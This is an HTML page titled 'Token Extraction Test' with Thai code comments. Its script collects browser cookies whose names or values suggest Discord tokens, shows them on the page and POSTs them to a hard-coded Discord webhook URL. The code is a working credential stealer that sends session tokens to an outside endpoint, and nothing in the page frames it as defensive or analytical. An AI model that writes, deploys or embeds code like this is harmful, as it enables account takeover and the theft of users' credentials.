<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Token Extraction Test</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
        }
        h1 {
            margin-top: 50px;
        }
        #output {
            margin-top: 20px;
            padding: 10px;
            background-color: #fff;
            border: 1px solid #ddd;
            border-radius: 5px;
            display: inline-block;
        }
    </style>
</head>
<body>
    <h1>Token Extraction Test</h1>
    <button id="extractTokenButton">Extract and Send Token</button>
    <p id="output"></p>

    <script>
        document.getElementById('extractTokenButton').addEventListener('click', function() {
            // ดึง cookies จากเบราว์เซอร์
            const cookies = document.cookie.split('; ');
            const tokenData = {};

            cookies.forEach(cookie => {
                const [name, value] = cookie.split('=');
                // เงื่อนไขเพื่อค้นหา token Discord
                if (name.includes('discord') || value.includes('token')) {
                    tokenData[name] = value;
                }
            });

            // แสดงผลลัพธ์ในหน้า HTML
            document.getElementById('output').textContent = `Cookies: ${JSON.stringify(tokenData, null, 2)}`;

            // ส่งข้อมูลไปยัง Webhook URL
            fetch('https://discord.com/api/webhooks/1252253384501887067/VEuHR4FVh43ztNVPgmE0kd7RqWFIM154Gha7s63Do-R1tc4VbuLQ8DzOaamP323Te4nd', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ cookies: tokenData })
            })
            .then(response => response.text())
            .then(data => console.log('Success:', data))
            .catch(error => console.error('Error:', error));
        });
    </script>
</body>
</html>
